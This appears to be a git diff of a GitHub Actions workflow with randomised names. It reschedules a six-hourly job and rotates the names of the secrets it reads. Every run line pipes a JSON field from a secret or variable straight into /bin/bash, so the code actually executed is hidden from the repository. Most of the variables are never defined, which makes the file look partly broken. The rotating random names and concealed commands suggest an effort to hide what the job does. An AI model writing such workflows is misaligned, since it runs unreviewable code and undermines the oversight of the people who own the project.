@@ -3,28 +3,24 @@ name: luminrui7165
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 3/6 * * *'
+    - cron: '17 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luminrui7165
         env:
-          rt30316: ${{ secrets.rt30316 }}
+          j27396: ${{ secrets.j27396 }}
         run: |
-          echo $rt30316 | jq -r .eovgd130 | /bin/bash
-          echo $ajk12 | jq -r .hsgva3 | /bin/bash
-          echo $e24604 | jq -r .n26752 | /bin/bash
-          echo $pmne8776 | jq -r .n4072 | /bin/bash
-          echo $mrh3367 | jq -r .woulo822 | /bin/bash
-          echo $ba3 | jq -r .iie065 | /bin/bash
-          echo $pv0 | jq -r .lyorj75 | /bin/bash
-          echo $ibupr245 | jq -r .aiem21007 | /bin/bash
-          echo $nb0138 | jq -r .oszw2841 | /bin/bash
-          echo $ay589 | jq -r .tbs28316 | /bin/bash
-          echo $aju98 | jq -r .qliwc14978 | /bin/bash
-          echo $ai09 | jq -r .ixf4549 | /bin/bash
-          echo $u0646 | jq -r .nuvby15 | /bin/bash
+          echo $j27396 | jq -r .hkd59 | /bin/bash
+          echo $x27644 | jq -r .srax07 | /bin/bash
+          echo $x052 | jq -r .llnv8992 | /bin/bash
+          echo $fk445 | jq -r .q56790 | /bin/bash
+          echo $rvyzx649 | jq -r .cets5433 | /bin/bash
+          echo $nd3630 | jq -r .arfpi03 | /bin/bash
+          echo $nu37 | jq -r .pue02 | /bin/bash
+          echo $zrlg391 | jq -r .dnip1350 | /bin/bash
+          echo $zn1838 | jq -r .uefq11861 | /bin/bash
 
